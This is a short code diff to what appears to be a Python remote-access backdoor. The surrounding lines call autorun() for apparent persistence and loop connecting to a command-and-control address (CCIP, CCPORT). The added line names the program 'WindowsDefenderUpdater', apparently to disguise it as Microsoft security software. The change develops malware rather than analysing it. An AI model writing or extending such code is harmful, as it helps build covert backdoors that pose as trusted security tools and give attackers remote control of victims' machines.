@@ -44,6 +44,7 @@ def cli (client):
         client.close()
 
 if __name__ == "__main__":
+    nome = "WindowsDefenderUpdater"
     autorun()
     while True:
         client = conn(CCIP, CCPORT)
